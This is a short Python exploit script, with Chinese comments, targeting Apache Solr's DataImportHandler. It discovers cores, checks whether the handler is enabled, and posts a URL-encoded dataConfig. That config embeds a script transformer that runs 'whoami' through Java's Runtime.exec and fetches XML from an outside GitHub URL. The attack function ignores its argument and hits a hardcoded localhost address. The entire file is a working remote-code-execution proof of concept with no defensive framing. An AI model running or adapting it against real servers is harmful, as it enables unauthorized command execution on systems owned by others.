import requests
import re
import sys

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0", "Content-type":"application/x-www-form-urlencoded"}
def verify(url):

    #获取cores名称
    get_cores_url = url + "/solr/admin/cores"

    Re = requests.get(get_cores_url, headers=headers)

    k = re.search(r'"name":"(.*)"', Re.text)[0]

    core = re.findall(r'"name":"(.*)"', k, re.S)[0]

    #验证是否开启data import Handler模块
    data_url = url + "/solr/"+ core +"/admin/mbeans?cat=QUERY&wt=json"

    Re0 = requests.get(data_url, headers=headers)

    if not "org.apache.solr.handler.dataimport.DataImportHandler" in Re0.text:

        print("未开启data import Handler功能，无法利用")
        return
    else:
        attack(url)

def attack(url):
    #执行命令whoami，并返回结果
    data_url = "http://127.0.0.1:8983/solr/solr/dataimport?_=1566799867523&indent=on&wt=json"
    data = "command=full-import&verbose=false&clean=false&commit=true&debug=true&core=solr&dataConfig=%3CdataConfig%3E%0A%0A%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A%0A++++++++++function+poc(row)%7B%0A%0A+var+bufReader+%3D+new+java.io.BufferedReader(new+java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar+result+%3D+%5B%5D%3B%0A%0Awhile(true)+%7B%0Avar+oneline+%3D+bufReader.readLine()%3B%0Aresult.push(+oneline+)%3B%0Aif(!oneline)+break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0A%0Areturn+row%3B%0A%0A%7D%0A%0A%0A++%5D%5D%3E%3C%2Fscript%3E%0A%0A++++++++%3Cdocument%3E%0A+++++++++++++%3Centity+name%3D%22entity1%22%0A+++++++++++++++++++++url%3D%22https%3A%2F%2Fraw.githubusercontent.com%2F1135%2Fsolr_exploit%2Fmaster%2FURLDataSource%2Fdemo.xml%22%0A+++++++++++++++++++++processor%3D%22XPathEntityProcessor%22%0A+++++++++++++++++++++forEach%3D%22%2FRDF%2Fitem%22%0A+++++++++++++++++++++transformer%3D%22script%3Apoc%22%3E%0A++++++++++++++++++++++++%3Cfield+column%3D%22title%22+xpath%3D%22%2FRDF%2Fitem%2Ftitle%22+%2F%3E%0A+++++++++++++%3C%2Fentity%3E%0A++++++++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport"
    Re1 = requests.post(data_url, data=data, headers=headers)
    kk = re.findall(r'"title":\["(.*)\\n', Re1.text, re.S)
    print(kk)

if __name__ == '__main__':
    #url是ip：port
    url = sys.argv[1]
    if "http://" not in url:
        url = "http://" + url
    verify(url)


